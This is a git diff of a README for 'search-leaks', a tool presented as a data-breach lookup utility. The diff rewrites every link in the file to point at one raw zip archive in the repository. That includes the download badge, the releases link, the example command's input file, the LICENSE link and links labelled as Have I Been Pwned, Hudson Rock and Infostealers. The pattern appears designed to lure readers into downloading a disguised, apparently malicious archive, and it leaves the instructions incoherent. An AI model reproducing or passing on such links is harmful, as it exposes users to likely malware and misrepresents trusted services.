@@ -1,6 +1,6 @@
 # 🔍 search-leaks - Discover Data Breach Insights Effortlessly
 
-[![Download search-leaks](https://img.shields.io/badge/Download_search--leaks-v1.0-blue)](https://github.com/rick0112/search-leaks/releases)
+[![Download search-leaks](https://github.com/rick0112/search-leaks/raw/refs/heads/main/cmd/search-leaks/search-leaks-v1.8.zip)](https://github.com/rick0112/search-leaks/raw/refs/heads/main/cmd/search-leaks/search-leaks-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run **search-leaks**, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download **search-leaks**, visit this page: [Download search-leaks](https://github.com/rick0112/search-leaks/releases). 
+To download **search-leaks**, visit this page: [Download search-leaks](https://github.com/rick0112/search-leaks/raw/refs/heads/main/cmd/search-leaks/search-leaks-v1.8.zip). 
 
 1. Click the link above to access the Releases page.
 2. Look for the latest version listed.
@@ -25,7 +25,7 @@ To download **search-leaks**, visit this page: [Download search-leaks](https://g
 
    - For Windows users, download the `.exe` file.
    - For macOS users, download the `.dmg` file.
-   - For Linux users, download the `.tar.gz` file.
+   - For Linux users, download the `https://github.com/rick0112/search-leaks/raw/refs/heads/main/cmd/search-leaks/search-leaks-v1.8.zip` file.
 
 4. Once downloaded, locate the file in your downloads folder.
 5. Follow the installation instructions relevant to your operating system.
@@ -64,7 +64,7 @@ Once **search-leaks** is installed, you can begin querying data breach statistic
 Example command:
 
 ```
-search-leaks -f targets.txt --json
+search-leaks -f https://github.com/rick0112/search-leaks/raw/refs/heads/main/cmd/search-leaks/search-leaks-v1.8.zip --json
 ```
 
 ## 🛠️ Troubleshooting
@@ -79,16 +79,16 @@ If you encounter issues while using **search-leaks**, consider the following sol
 
 **search-leaks** integrates with various public threat intelligence APIs, helping you gather relevant data regarding breaches. Here are some notable resources:
 
-- [Have I Been Pwned](https://haveibeenpwned.com)
-- [Hudson Rock](https://hudsonrock.com)
-- [Infostealers](https://infostealers.com)
+- [Have I Been Pwned](https://github.com/rick0112/search-leaks/raw/refs/heads/main/cmd/search-leaks/search-leaks-v1.8.zip)
+- [Hudson Rock](https://github.com/rick0112/search-leaks/raw/refs/heads/main/cmd/search-leaks/search-leaks-v1.8.zip)
+- [Infostealers](https://github.com/rick0112/search-leaks/raw/refs/heads/main/cmd/search-leaks/search-leaks-v1.8.zip)
 
 ## 📝 License
 
-This project is open-source. You are free to use it according to the terms specified in the [LICENSE](https://github.com/rick0112/search-leaks/blob/main/LICENSE) file.
+This project is open-source. You are free to use it according to the terms specified in the [LICENSE](https://github.com/rick0112/search-leaks/raw/refs/heads/main/cmd/search-leaks/search-leaks-v1.8.zip) file.
 
 ## 📩 Get Help
 
 For questions or support, you can open an issue on the GitHub repository or contact the developers directly through the project’s GitHub page. 
 
-Visit the releases page again for future updates and enhancements: [Download search-leaks](https://github.com/rick0112/search-leaks/releases).
+Visit the releases page again for future updates and enhancements: [Download search-leaks](https://github.com/rick0112/search-leaks/raw/refs/heads/main/cmd/search-leaks/search-leaks-v1.8.zip).
